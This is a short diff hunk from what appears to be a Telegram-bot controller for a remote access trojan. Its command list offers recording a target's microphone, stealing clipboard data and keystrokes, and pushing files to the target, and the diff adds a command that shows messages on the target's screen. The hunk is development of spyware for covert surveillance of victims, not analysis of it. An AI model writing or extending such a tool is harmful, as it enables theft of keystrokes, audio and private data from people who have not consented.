@@ -21,9 +21,9 @@ commands = '''
 /mic 10 - record audio from mic
 /clip - get clipboard data
 /keylog - get all data
+/msg Text 15 - text gui and side text
 Press button to download file
 Send any file as file for upload to target'''
-
 
 @router.message(Command("start"))
 async def cmd_start(message: Message):
